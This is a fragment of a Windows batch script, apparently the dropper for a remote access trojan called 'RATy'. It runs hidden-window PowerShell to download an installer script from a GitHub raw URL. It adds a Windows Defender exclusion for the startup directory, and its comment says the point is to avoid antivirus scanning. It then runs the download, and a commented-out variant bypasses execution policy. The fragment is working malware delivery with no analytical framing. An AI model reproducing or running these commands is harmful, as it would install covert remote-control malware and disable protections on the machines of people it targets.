...
@REM RATy resources
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest-URI 'https://raw.githubusercontent.com/mohid-mughal/RATy/refs/heads/main/files/Installer.ps1' -OutFile 'installer.ps1' "; Add-MpPreference-ExclusionPath "%STARTUPdir%"; ./installer.ps1  & @REM attempt to exclude STARTUP directory from being scanned by AVs
@REM powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1" & @REM Execution Policy Bypass
